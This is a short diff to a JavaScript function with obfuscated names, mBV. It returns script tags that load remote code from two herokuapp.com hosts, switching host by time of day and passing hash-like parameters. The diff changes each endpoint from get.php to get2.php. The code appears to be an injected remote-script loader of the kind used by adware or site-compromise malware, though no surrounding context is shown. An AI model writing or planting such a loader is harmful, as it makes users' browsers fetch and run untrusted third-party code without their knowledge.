@@ -164,23 +164,23 @@ function mBV(s,b,t){
 
  if(nH>=12){
      if(s=='s'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
      }
      if(s=='b'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
      }
      if(s=='m'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://lit-shore-57528.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
      }
  }else{
      if(s=='s'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=072dd228c519a31a4894e0005b4f3ad6\"><\/script>'+bEn;
      }
      if(s=='b'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=4ee7ba830860b984f54c5068ef2ff111\"><\/script>'+bEn;
      }
      if(s=='m'&&t!=0){
-         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
+         return bSt+'<script id="yp_1391" src=\"https://arcane-anchorage-86502.herokuapp.com/get2.php?a=a15faa52c7e806cd608a2959fe0fe760\"><\/script>'+bEn;
      }
  }
 
